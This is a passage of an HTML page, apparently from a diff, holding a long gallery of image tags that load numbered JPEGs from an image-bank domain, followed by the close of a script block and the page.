src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image63.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image62.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image102.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image150.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image143.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image218.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image151.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image88.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image64.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image122.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image166.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image205.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image174.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image187.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image73.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image49.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image199.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image25.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image92.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image94.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image133.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image107.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image43.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image181.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image23.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image89.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image26.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image153.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image161.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image57.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image105.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image9.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image28.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image84.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image197.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image136.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image198.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image72.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image226.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image137.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image14.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image41.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image175.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image21.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image209.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image167.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image52.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image66.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image214.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image91.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image144.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image160.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image80.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image71.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image75.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image69.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image194.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image34.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image96.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image115.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image225.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image227.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image125.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image141.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image203.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image169.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image223.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image145.jpeg" alt="Image"></div><div class="image-container"><img src="https://kuvapankki.kyberturvallisuuskeskus.com/kuvat/Image129.jpeg" alt="Image"></div> 		
+	</div>
+
+
+			`;
+		}
+
+
+
+
+    </script>
+</body>
+</html>
